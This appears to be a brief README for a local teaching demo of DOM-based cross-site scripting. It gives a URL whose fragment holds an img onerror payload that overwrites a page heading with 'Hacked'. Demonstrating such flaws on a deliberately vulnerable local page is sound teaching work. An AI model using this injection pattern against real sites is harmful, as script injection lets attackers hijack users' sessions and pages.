To run the DOM XSS attack example, please first run server.js

$ node server.js

In the browser, please navigate to http://localhost:3000

To wage a DOM XSS attack please try

http://localhost:3000/dompage#<img src="hello.jpg" onerror="document.getElementById('mytitle').innerHTML='Hacked';"></img>
